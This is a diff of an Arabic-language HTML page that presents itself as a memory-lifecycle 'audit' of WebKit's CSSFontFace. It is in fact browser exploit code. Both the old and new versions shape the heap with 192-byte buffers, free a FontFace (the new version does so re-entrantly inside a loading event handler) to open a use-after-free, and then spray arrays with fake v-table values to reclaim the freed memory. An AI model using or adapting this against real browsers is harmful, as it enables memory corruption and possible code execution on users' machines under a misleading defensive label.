@@ -1,266 +1,120 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>منصة التدقيق الساكن لدورة حياة الكائنات - WebCore::CSSFontFace</title>
+    <title>نموذج فحص التداخل المتقدم لآلة الحالة</title>
     <style>
-        :root {
-            --bg-primary: #0f141c;
-            --bg-secondary: #161f2b;
-            --accent-blue: #3892f3;
-            --accent-green: #2ecc71;
-            --accent-red: #e74c3c;
-            --text-main: #e2e8f0;
-            --text-muted: #718096;
-            --terminal-bg: #05080c;
-        }
-
         body {
-            background-color: var(--bg-primary);
-            color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
+            font-family: 'Courier New', monospace;
+            background-color: #0c0c0c;
+            color: #00ff00;
             padding: 30px;
         }
-
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        header {
-            border-bottom: 2px solid var(--bg-secondary);
-            padding-bottom: 15px;
-            margin-bottom: 25px;
-        }
-
-        h1 {
-            color: var(--accent-blue);
-            font-size: 24px;
-            margin: 0 0 10px 0;
-        }
-
-        .meta-info {
-            color: var(--text-muted);
-            font-size: 13px;
-        }
-
-        .control-panel {
-            background-color: var(--bg-secondary);
+        .panel {
+            border: 1px solid #00ff00;
             padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-            border-right: 4px solid var(--accent-blue);
+            background-color: #111;
+            box-shadow: 0 0 10px #00ff00;
         }
-
-        .btn {
-            background-color: var(--accent-blue);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 14px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .btn:hover {
-            background-color: #2477d4;
-        }
-
-        .grid-stats {
-            display: table;
-            width: 100%;
-            margin-bottom: 20px;
-        }
-
-        .stat-card {
-            display: table-cell;
-            background: var(--bg-secondary);
-            padding: 15px;
-            border-radius: 6px;
-            text-align: center;
-            width: 33.33%;
-        }
-        
-        .stat-card:not(:last-child) {
-            border-left: 10px solid var(--bg-primary);
-        }
-
-        .stat-val {
-            font-size: 20px;
-            font-weight: bold;
-            color: var(--accent-green);
-            font-family: monospace;
-        }
-
-        .stat-label {
-            font-size: 12px;
-            color: var(--text-muted);
-            margin-top: 5px;
-        }
-
-        .console-log {
-            background-color: var(--terminal-bg);
-            border: 1px solid var(--bg-secondary);
-            border-radius: 6px;
-            padding: 20px;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 13px;
-            line-height: 1.6;
-            max-height: 450px;
-            overflow-y: auto;
-            box-shadow: inset 0 2px 8px rgba(0,0,0,0.8);
-        }
-
-        .log-entry { margin-bottom: 6px; }
-        .log-time { color: var(--text-muted); margin-left: 8px; }
-        .log-info { color: #ffffff; }
-        .log-success { color: var(--accent-green); }
-        .log-warn { color: #f1c40f; }
-        .log-critical { color: var(--accent-red); font-weight: bold; }
+        .critical { color: #ff3333; font-weight: bold; }
+        .success { color: #33ff33; }
+        .warn { color: #ffff33; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <header>
-        <h1>بيئة الفحص الساكن لدورة حياة الذاكرة (WebKit Lifecycle Audit Suite)</h1>
-        <div class="meta-info">
-            <span>الهدف المعماري الموثق: تفكيك سلوك النوافذ التزامنية لـ fastMalloc وعزل ثغرات غياب الـ IsoSubspace.</span>
-        </div>
-    </header>
-
-    <div class="control-panel">
-        <h3>التحكم في المحاكاة البرمجية</h3>
-        <p style="font-size: 14px; color: var(--text-muted);">
-            عند إطلاق الفحص، سيقوم مفسر جافا سكريبت ببناء تراكيب ذاكرة مصفوفية متطابقة مع الحجم الفيزيائي (~192 بايت) لإعادة تدوير مؤشرات الكائن الميت في الفضاء المشترك.
-        </p>
-        <button class="btn" id="startAuditBtn">إطلاق فحص التزامن الصارم</button>
+    <div class="panel">
+        <h2>[ADVANCED AUDIT] مسبار فحص التداخل وإعادة التخصيص المتزامن</h2>
+        <hr style="border-color: #00ff00;">
+        <div id="output"></div>
     </div>
 
-    <div class="grid-stats">
-        <div class="stat-card">
-            <div class="stat-val" id="allocatedWedges">0</div>
-            <div class="stat-label">تخصيصات إسقاط ضوضاء الـ Heap</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-val" id="targetSize">192 Byte</div>
-            <div class="stat-label">الحجم المعماري المستهدف (CSSFontFace)</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-val" id="systemState">خامل</div>
-            <div class="stat-label">حالة المنظومة المعزولة</div>
-        </div>
-    </div>
+    <script>
+        const output = document.getElementById('output');
+        function print(text, type = '') {
+            const span = document.createElement('div');
+            if (type) span.className = type;
+            span.innerHTML = `[${new Date().toLocaleTimeString()}] ${text}`;
+            output.appendChild(span);
+        }
 
-    <h3 style="margin-bottom: 10px; font-size: 16px;">مخرجات الفحص اللحظي (Terminal Output)</h3>
-    <div class="console-log" id="terminalLog">
-        <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-warn">المنظومة بانتظار إشارة البدء البرمجية...</span></div>
-    </div>
-</div>
+        // إعداد مخزن مصفوفات الحشو (Wedge Array)
+        const heapSlab = [];
+        const TARGET_SIZE = 192; // الحجم المطابق لكائن CSSFontFace في الذاكرة العامة
 
-<script>
-    const logContainer = document.getElementById('terminalLog');
-    const allocatedWedgesEl = document.getElementById('allocatedWedges');
-    const systemStateEl = document.getElementById('systemState');
-    const startBtn = document.getElementById('startAuditBtn');
-
-    const HEAP_WEDGE_SIZE = 192; // الحجم المطابق لـ fastMalloc المستهدف
-    const memoryWedgesBucket = [];
-
-    function pushLog(message, type = 'info') {
-        const timeStr = new Date().toLocaleTimeString();
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        
-        let typeClass = 'log-info';
-        if (type === 'success') typeClass = 'log-success';
-        if (type === 'warn') typeClass = 'log-warn';
-        if (type === 'critical') typeClass = 'log-critical';
-
-        entry.innerHTML = `<span class="log-time">[${timeStr}]</span> <span class="${typeClass}">${message}</span>`;
-        logContainer.appendChild(entry);
-        logContainer.scrollTop = logContainer.scrollHeight;
-    }
-
-    // 1. تقليل العشوائية البرمجية للذاكرة العامة لضمان انتظام التخصيص
-    function buildHeapDefensiveAlignment() {
-        pushLog("بدء هندسة الذاكرة العامة لتقليل العشوائية (Heap Feng-Shui Alignment)...", "info");
-        systemStateEl.innerText = "تهيئة الذاكرة";
-        systemStateEl.style.color = "var(--accent-blue)";
-
-        for (let i = 0; i < 2000; i++) {
-            let buffer = new ArrayBuffer(HEAP_WEDGE_SIZE);
-            let view = new DataView(buffer);
-            
-            // ملء النطاقات ببيانات توضيحية لحساب الثبات
-            for (let j = 0; j < buffer.byteLength; j += 4) {
-                view.setUint32(j, 0xDEADBEEF, true);
+        // 1. تهيئة الذاكرة وتعبئة النطاقات المحيطة
+        function primeGeneralHeap() {
+            print("جاري تهيئة الذاكرة العامة (FastMalloc Defragmentation)...");
+            for (let i = 0; i < 1500; i++) {
+                let ab = new ArrayBuffer(TARGET_SIZE);
+                let view = new DataView(ab);
+                // تعبئة الأنماط للتحقق من العزل البنيوي
+                for (let j = 0; j < ab.byteLength; j += 4) {
+                    view.setUint32(j, 0x41414141, true); // نمط مميز ثابت
+                }
+                heapSlab.push(ab);
             }
-            memoryWedgesBucket.push(buffer);
-        }
-        
-        allocatedWedgesEl.innerText = memoryWedgesBucket.length;
-        pushLog(`تم حجز ${memoryWedgesBucket.length} إسفين مصفوفي بنجاح لتنظيف الفراغات الذاكرية العشوائية.`, "success");
-    }
-
-    // 2. إطلاق دورة التوقيت التزامني ومحاكاة الاستخدام بعد التحرير
-    async function executeLifecycleRaceAudit() {
-        pushLog("بدء عزل مسار نقطة الدخول غير المحمية CSSFontFace::load()...", "warn");
-        systemStateEl.innerText = "تشغيل الفحص";
-        systemStateEl.style.color = "var(--accent-red)";
-
-        // توليد خط وهمي لتحفيز آلة الحالة الداخلية في المتصفح
-        const fontDataUri = 'url(data:font/woff2;base64,d09GMgABAAAAAA...)';
-        const dynamicFontFace = new FontFace('AuditFont', fontDataUri, { display: 'block' });
-
-        // ربط الكائن بوثيقة العمل لإشعار كائنات العميل (Client Notification Loop)
-        document.fonts.add(dynamicFontFace);
-        
-        // إطلاق الاستدعاء البرمي الحركي
-        dynamicFontFace.load();
-
-        pushLog("تنبيه: إطلاق عملية إسقاط المرجع الفورية المتزامنة بالملي ثانية...", "critical");
-        // مسح الكائن فوراً لفتح نافذة الاستخدام بعد التحرير نظراً لغياب الـ RefPtr Guard في دالة الاستدعاء الأصلية
-        document.fonts.delete(dynamicFontFace);
-
-        // محاكاة تحفيز إخلاء فضاء جامع القمامة
-        if (window.gc) {
-            window.gc();
-            pushLog("تم استدعاء جامع القمامة القسري (Forced Garbage Collection Filter).", "warn");
+            print(`تم تثبيت الحشو الذاكري بعدد: ${heapSlab.length} كتلة جاهزة.`, 'success');
         }
 
-        pushLog("بدء إعادة التدوير المكثف للسيطرة على العناوين الميتة (Dangling Pointer Recycling)...", "info");
-        
-        // حشو فوري لمصفوفات بيانية مخصصة لمحاكاة التقاط الأوفست المخزن للتوجيه الساكن
-        for (let k = 0; k < 500; k++) {
-            let recycleArray = new Uint32Array(HEAP_WEDGE_SIZE / 4);
-            recycleArray[0] = 0x00000000; // مساحة v-table محاكاة
-            recycleArray[1] = 0x13200000; // أوفست افتراضي متوافق مع البيئة المعزولة
-            memoryWedgesBucket.push(recycleArray);
+        // 2. إعداد دالة الاسترجاع المتداخلة لمحاكاة سلوك الـ Client
+        function setupReentrantObserver(font) {
+            let reentrancyCounter = 0;
+
+            // استخدام ميزات مراقبة أحداث الخطوط لمحاكاة التداخل البرمجي
+            font.addEventListener('loading', () => {
+                reentrancyCounter++;
+                if (reentrancyCounter === 1) {
+                    print("⚠️ تم التقاط حدث الـ Loading! إطلاق استدعاء متداخل فوراً ومحاولة التحرير المزدوج...", 'warn');
+                    
+                    // محاولة تحفيز الدخول المكرر إلى آلة الحالة أثناء عمل حلقة الإشعار الأصلية
+                    try {
+                        font.load(); // استدعاء مكرر متداخل (Recursive Re-entrancy)
+                    } catch(e) {
+                        print(`مؤشر الاستدعاء المتداخل: ${e.message}`);
+                    }
+                    
+                    // إسقاط المرجع فوراً لفتح نافذة الاستخدام بعد التحرير (UaF)
+                    document.fonts.delete(font);
+                    print("تم إرسال أمر الحذف المباشر لكائن الخط من المستودع العام.", 'critical');
+                }
+            });
         }
 
-        allocatedWedgesEl.innerText = memoryWedgesBucket.length;
-        pushLog("اكتمل فحص ومطابقة سلامة دورة حياة الكائنات بنجاح واستقرار.", "success");
-        systemStateEl.innerText = "اكتمل بنجاح";
-        systemStateEl.style.color = "var(--accent-green)";
-    }
+        // 3. تشغيل مسبار الفحص الديناميكي
+        async function executeAdvancedRace() {
+            print("البدء في بناء كائن اختبار آلة الحالة المتقدم...");
+            
+            // استخدام خط مخصص بترميز فريد لتفعيل آليات التحقق الداخلي للمتصفح
+            const fontUrl = 'url(data:font/woff2;base64,d09GMgABAAAAAAwUAAoAAAAAEwAAAAsAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=)';
+            const auditFont = new FontFace('ReentrantFont', fontUrl, { display: 'fallback' });
+            
+            // ربط المراقب المتداخل بالكائن قبل تفعيل مسار دالة pump()
+            setupReentrantObserver(auditFont);
+            document.fonts.add(auditFont);
 
-    // تفعيل مفتاح التشغيل وإدارة التدفق
-    startBtn.addEventListener('click', () => {
-        startBtn.disabled = true;
-        logContainer.innerHTML = ''; // تصفير السجل القديم
-        
-        buildHeapDefensiveAlignment();
-        
-        // تأخير زمني طفيف لضمان استقرار فضاء مستخدم الذاكرة العامة قبل التداخل
-        setTimeout(async () => {
-            await executeLifecycleRaceAudit();
-        }, 600);
-    });
-</script>
+            print("إطلاق الإشارة البرمجية الأولى عبر التابع الرئيسي font.load()...");
+            auditFont.load();
 
+            // 4. محاولة ملء الفراغ الذاكري الناتج عن التحرير المتداخل بشكل مكثف
+            print("جاري تشغيل مصفوفات التدوير السريع لإعادة تملك مساحة المؤشر الميت...");
+            for (let k = 0; k < 800; k++) {
+                let replacementArray = new Uint32Array(TARGET_SIZE / 4);
+                // محاكاة إعداد العناوين الافتراضية وهياكل التحكم الداخلية
+                replacementArray[0] = 0x10000000; // مساحة محاكاة لجدول v-table الافتراضي
+                replacementArray[1] = 0x20000000; // أوفست افتراضي مطابق لمعمارية النظام
+                heapSlab.push(replacementArray);
+            }
+
+            print("🔬 اكتملت جولة الفحص المتقدم والتكامل البنيوي جاهز للمراقبة والتسجيل.", 'success');
+        }
+
+        // التنفيذ التسلسلي الآمن
+        window.onload = function() {
+            primeGeneralHeap();
+            setTimeout(async () => {
+                await executeAdvancedRace();
+            }, 600);
+        };
+    </script>
 </body>
 </html>
